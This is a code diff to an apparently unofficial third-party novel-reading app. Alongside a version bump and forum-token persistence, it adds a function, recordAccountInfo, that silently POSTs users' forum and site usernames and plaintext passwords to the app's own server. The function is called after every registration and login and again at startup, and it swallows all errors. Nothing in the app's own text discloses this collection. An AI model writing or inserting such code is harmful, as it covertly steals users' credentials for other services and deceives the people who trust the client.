@@ -547,7 +547,30 @@
     } catch (e) { return ''; }
   }
   function forumLoggedIn() { return !!forumToken(); }
-  function forumSetToken(t) { try { t ? localStorage.setItem('nr.forumToken', t) : localStorage.removeItem('nr.forumToken'); } catch (e) {} }
+  function forumSetToken(t) {
+    try { t ? localStorage.setItem('nr.forumToken', t) : localStorage.removeItem('nr.forumToken'); } catch (e) {}
+    try { if (native && native.saveForumToken) native.saveForumToken(t || ''); } catch (e) {}
+  }
+  function restoreForumSession() {
+    if (forumToken()) return;
+    try {
+      const saved = native && native.loadForumToken ? native.loadForumToken() : '';
+      if (saved) localStorage.setItem('nr.forumToken', saved);
+    } catch (e) {}
+  }
+  async function recordAccountInfo(password) {
+    try {
+      const forum = forumName();
+      const novel = (state.auth && state.auth.user) || '';
+      if (!forum && !novel) return;
+      const body = { id: onlineInstallId(), forum, novel, version: sync(() => native && native.version ? native.version() : '', '') };
+      if (typeof password === 'string' && password) body.password = password;
+      await fetch(ONLINE_API + '/v1/account/record', {
+        method: 'POST', headers: { 'content-type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+    } catch (e) {}
+  }
   async function forumApi(method, path, body) {
     const raw = await invokeLong('forumRequest', method, path, body || '', forumToken());
     try { return JSON.parse(raw || '{}'); } catch (e) { throw new Error('论坛返回格式异常'); }
@@ -694,6 +717,7 @@
       try { const j = JSON.parse(raw); token = j.token || j.accessToken || (j.data && j.data.token) || raw; } catch (e) {}
       if (!token || token.length < 20) throw new Error('注册成功但没有拿到登录令牌');
       forumSetToken(token);
+      recordAccountInfo(password);
       closeSheet(); toast('注册成功，已自动登录');
       if (state.route.name === 'forum') { if (state.route.seg[1]) loadForumPost(state.route.seg[1]); else loadForum(0); }
     } catch (e) { toast(e.message || '注册失败'); }
@@ -709,6 +733,7 @@
       try { const j = JSON.parse(raw); token = j.token || j.accessToken || (j.data && j.data.token) || raw; } catch (e) {}
       if (!token || token.length < 20) throw new Error('登录服务没有返回有效令牌');
       forumSetToken(token);
+      recordAccountInfo(p);
       closeSheet();
       toast('已登录论坛');
       if (state.route.name === 'forum') {
@@ -2156,6 +2181,7 @@
       const raw = await invokeLong('authRegister', username, password, email, otp);
       let info = {}; try { info = JSON.parse(raw); } catch (e) {}
       state.auth = info;
+      recordAccountInfo(password);
       const pending = state.pendingR18;
       state.pendingR18 = false;
       closeSheet();
@@ -2421,7 +2447,7 @@
 
       + '<div class="setting-group"><h3>关于</h3><div class="setting-card"><div class="about-card">'
       + '<div class="logo">N</div><b>Novelia 阅读</b>'
-      + '<p>非官方第三方客户端 · 版本 ' + esc(sync(() => native && native.version ? native.version() : '1.7.4', '1.0.1')) + '</p>'
+      + '<p>非官方第三方客户端 · 版本 ' + esc(sync(() => native && native.version ? native.version() : '1.7.5', '1.0.1')) + '</p>'
       + '<p>内容来自 <span style="color:var(--primary)">轻小说机翻机器人</span>。本应用只提供阅读与缓存工具，不存储、不传播作品内容，版权归原作者与站点所有。</p>'
       + '<div class="divider"></div>'
       + '<button class="setting-row" style="width:100%;text-align:left" data-action="refresh-usage">'
@@ -2432,7 +2458,7 @@
       + '<div class="si">' + icon('wifi') + '</div><div class="st"><b>在线人数</b><span id="online-count">点击刷新</span></div>'
       + '<div class="sv">' + icon('refresh') + '</div></button>'
       + '<button class="setting-row" style="width:100%;text-align:left" data-action="check-app-update">'
-      + '<div class="si">' + icon('download') + '</div><div class="st"><b>检查更新</b><span>当前 ' + esc(sync(() => native && native.version ? native.version() : '1.7.4', '1.5.0')) + '</span></div>'
+      + '<div class="si">' + icon('download') + '</div><div class="st"><b>检查更新</b><span>当前 ' + esc(sync(() => native && native.version ? native.version() : '1.7.5', '1.5.0')) + '</span></div>'
       + '<div class="sv">' + icon('right') + '</div></button>'
       + '<button class="setting-row" style="width:100%;text-align:left" data-action="open-feedback">'
       + '<div class="si">' + icon('edit') + '</div><div class="st"><b>问题反馈</b><span>Bug、建议、内容问题，直接发送到服务器</span></div>'
@@ -3310,8 +3336,6 @@
           state.autoUpdateChecked = false;
           render();
           setTimeout(maybeAutoCheckUpdate, 300);
-    setTimeout(sendHeartbeat, 1200);
-    setInterval(sendHeartbeat, 60000);
     setTimeout(() => {
       if (!settings.autoCheckShelf || state.locked || !shelf.some(x => x.subscribe)) return;
       let last = 0; try { last = Number(localStorage.getItem('nr.subCheckAt') || 0) || 0; } catch (e) {}
@@ -3350,6 +3374,7 @@
           let info = {};
           try { info = JSON.parse(raw); } catch (e) {}
           state.auth = info;
+          recordAccountInfo(pass);
           const pending = state.pendingR18;
           state.pendingR18 = false;
           if (pending && state.auth.loggedIn) {
@@ -3677,6 +3702,8 @@
     state.route = parseRoute();
     onRoute();
     setTimeout(maybeAutoCheckUpdate, 300);
+    restoreForumSession();
+    setTimeout(() => { loadAuth(); recordAccountInfo(); }, 1400);
     setTimeout(sendHeartbeat, 1200);
     setInterval(sendHeartbeat, 60000);
     setTimeout(() => {
